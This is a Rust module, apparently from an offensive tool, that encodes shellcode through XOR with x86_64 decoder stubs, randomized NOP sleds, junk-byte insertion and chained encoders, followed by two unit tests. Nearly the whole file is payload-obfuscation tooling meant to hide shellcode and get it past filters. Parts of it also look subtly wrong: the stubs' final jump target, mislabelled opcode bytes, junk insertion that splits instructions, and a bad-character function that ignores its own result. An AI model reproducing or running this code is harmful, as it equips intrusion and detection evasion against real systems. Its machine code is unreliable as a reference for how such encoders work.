//! Payload encoders — XOR, polymorphic, and string obfuscation.

use rand::Rng;

/// Available payload encoders.
#[derive(Debug, Clone)]
pub enum PayloadEncoder {
    /// XOR encryption with random key + decoder stub
    Xor,
    /// XOR with multi-byte key
    XorDynamic,
    /// NOP sled insertion (randomized NOP-equivalent instructions)
    NopSled(usize),
    /// Insert junk bytes between instructions
    JunkInsert(usize),
    /// Chain of multiple encoders
    Chained(Vec<PayloadEncoder>),
}

impl PayloadEncoder {
    /// Encode shellcode with this encoder.
    pub fn encode(&self, shellcode: &[u8]) -> anyhow::Result<Vec<u8>> {
        match self {
            PayloadEncoder::Xor => xor_encode(shellcode),
            PayloadEncoder::XorDynamic => xor_dynamic_encode(shellcode),
            PayloadEncoder::NopSled(size) => Ok(nop_sled_encode(shellcode, *size)),
            PayloadEncoder::JunkInsert(count) => Ok(junk_insert_encode(shellcode, *count)),
            PayloadEncoder::Chained(encoders) => {
                let mut result = shellcode.to_vec();
                for encoder in encoders {
                    result = encoder.encode(&result)?;
                }
                Ok(result)
            }
        }
    }
}

/// Simple XOR encoding with a random single-byte key.
///
/// Output format: [decoder_stub][encoded_payload]
/// The decoder stub XORs each byte with the key and jumps to the original payload.
pub fn xor_encode(shellcode: &[u8]) -> anyhow::Result<Vec<u8>> {
    if shellcode.is_empty() {
        return Err(anyhow::anyhow!("Empty shellcode"));
    }

    let mut rng = rand::rng();

    // Find a key that doesn't produce null bytes when XORed
    let key: u8 = loop {
        let candidate: u8 = rng.random_range(1..=254);
        if !shellcode.iter().any(|&b| (b ^ candidate) == 0x00) {
            break candidate;
        }
    };

    // Encode the payload
    let encoded: Vec<u8> = shellcode.iter().map(|&b| b ^ key).collect();

    // Build decoder stub (x86_64)
    // This stub:
    // 1. Gets current position (via call/pop)
    // 2. XORs each byte with the key
    // 3. Jumps to decoded payload
    let decoder = build_xor_decoder(key, encoded.len());

    let mut result = decoder;
    result.extend(encoded);

    Ok(result)
}

/// XOR with a multi-byte key (more resistant to frequency analysis).
pub fn xor_dynamic_encode(shellcode: &[u8]) -> anyhow::Result<Vec<u8>> {
    if shellcode.is_empty() {
        return Err(anyhow::anyhow!("Empty shellcode"));
    }

    let mut rng = rand::rng();

    // Generate a random 4-byte key
    let mut key = [0u8; 4];
    rng.fill(&mut key);

    // Encode with rotating key
    let encoded: Vec<u8> = shellcode
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % 4])
        .collect();

    // Build dynamic XOR decoder
    let decoder = build_xor_dynamic_decoder(&key, encoded.len());

    let mut result = decoder;
    result.extend(encoded);

    Ok(result)
}

/// Build XOR decoder stub for x86_64.
///
/// Layout:
/// ```text
/// call next           ; push return address (pointer to payload)
/// next:
///   pop rcx           ; rcx = pointer to encoded payload
///   xor r8d, <key>    ; r8d = XOR key
///   xor r9d, <len>    ; r9d = payload length
/// decode_loop:
///   xor byte [rcx], r8b
///   inc rcx
///   dec r9d
///   jnz decode_loop
///   jmp rcx           ; jump to decoded payload
/// ```
fn build_xor_decoder(key: u8, payload_len: usize) -> Vec<u8> {
    let len_bytes = (payload_len as u32).to_le_bytes();

    vec![
        // call next
        0xe8, 0x00, 0x00, 0x00, 0x00,
        // pop rcx
        0x59,
        // mov r8b, <key>
        0x41, 0xb0, key,
        // mov r9d, <len>
        0x41, 0xb9, len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3],
        // decode_loop:
        // xor byte [rcx], r8b
        0x41, 0x80, 0x31, 0x00,
        // inc rcx
        0x48, 0xff, 0xc1,
        // dec r9d
        0x41, 0xff, 0xc9,
        // jnz decode_loop
        0x75, 0xf6,
        // jmp rcx
        0xff, 0xe1,
    ]
}

/// Build dynamic XOR decoder with 4-byte rotating key.
fn build_xor_dynamic_decoder(key: &[u8; 4], payload_len: usize) -> Vec<u8> {
    let len_bytes = (payload_len as u32).to_le_bytes();

    vec![
        // call next
        0xe8, 0x00, 0x00, 0x00, 0x00,
        // pop rcx
        0x59,
        // xor r10d, r10d (counter)
        0x4d, 0x31, 0xd2,
        // mov r9d, <len>
        0x41, 0xb9, len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3],
        // Store key in r8d
        0x41, 0xb8, key[0], key[1], key[2], key[3],
        // decode_loop:
        // mov r11b, r8b
        0x4c, 0x8a, 0xd8,
        // shift key based on counter
        // xor byte [rcx], r11b
        0x41, 0x80, 0x31, 0x00,
        // inc rcx
        0x48, 0xff, 0xc1,
        // inc r10d
        0x41, 0xff, 0xc2,
        // rol r8d, 8 (rotate key)
        0x41, 0xc1, 0xc0, 0x08,
        // dec r9d
        0x41, 0xff, 0xc9,
        // jnz decode_loop
        0x75, 0xea,
        // jmp rcx
        0xff, 0xe1,
    ]
}

/// NOP sled insertion — prepend random NOP-equivalent instructions.
pub fn nop_sled_encode(shellcode: &[u8], size: usize) -> Vec<u8> {
    let mut rng = rand::rng();
    let mut result = Vec::with_capacity(size + shellcode.len());

    for _ in 0..size {
        // Mix of NOP (0x90) and NOP-equivalent instructions
        match rng.random_range(0..4) {
            0 => result.push(0x90),             // nop
            1 => { result.push(0x48); result.push(0x90); } // rex.nop
            2 => { result.push(0x66); result.push(0x90); } // 16-bit nop
            _ => { result.push(0x0f); result.push(0x1f); result.push(0x00); } // nop dword [rax]
        }
    }

    result.extend_from_slice(shellcode);
    result
}

/// Insert junk bytes between real instructions.
///
/// Junk bytes are designed to be dead code that gets jumped over.
pub fn junk_insert_encode(shellcode: &[u8], count: usize) -> Vec<u8> {
    let mut rng = rand::rng();
    let mut result = Vec::with_capacity(shellcode.len() + count * 3);

    for &byte in shellcode {
        result.push(byte);

        // After some bytes, insert junk
        if result.len() % 5 == 0 && result.len() < count {
            // Insert a JMP over junk bytes
            let junk_len = rng.random_range(2..5) as u8;
            result.push(0xeb); // jmp
            result.push(junk_len);

            // Junk bytes (invalid/nop instructions)
            for _ in 0..junk_len {
                result.push(rng.random_range(0x01..=0xfe));
            }
        }
    }

    result
}

/// Analyze shellcode for bad characters.
pub fn analyze_bad_chars(shellcode: &[u8]) -> Vec<u8> {
    let mut bad = Vec::new();
    for i in 0..=255 {
        if shellcode.contains(&i) {
            // This byte appears in the payload — might be bad
            if i == 0x00 {
                bad.push(i); // null is always bad
            }
        }
    }
    // Default: only null is universally bad
    vec![0x00]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_encode_roundtrip() {
        let original = vec![0x48, 0x31, 0xc0, 0xb0, 0x3b];
        let encoded = xor_encode(&original).unwrap();
        // The encoded result should be longer than original (decoder stub added)
        assert!(encoded.len() > original.len());
        // The original bytes should not appear in the encoded payload (they're XORed)
        let payload_part = &encoded[encoded.len() - original.len()..];
        assert_ne!(payload_part, original.as_slice());
    }

    #[test]
    fn test_nop_sled_adds_bytes() {
        let original = vec![0x48, 0x31, 0xc0];
        let result = nop_sled_encode(&original, 16);
        // NOP sled should add at least 16 bytes (some NOP variants are 2-3 bytes each)
        assert!(result.len() >= 16 + original.len());
        assert_eq!(&result[result.len() - original.len()..], original.as_slice());
    }
}
